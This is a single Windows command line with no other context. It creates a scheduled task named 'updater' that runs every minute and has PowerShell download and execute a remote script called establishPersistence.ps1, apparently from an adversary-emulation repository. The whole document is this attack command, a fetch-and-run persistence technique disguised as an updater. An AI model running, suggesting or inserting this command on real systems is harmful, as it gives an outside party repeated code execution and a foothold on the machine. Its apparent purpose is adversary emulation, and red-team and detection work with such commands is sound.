schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/establishPersistence.ps1 -UseBasicParsing).Content"

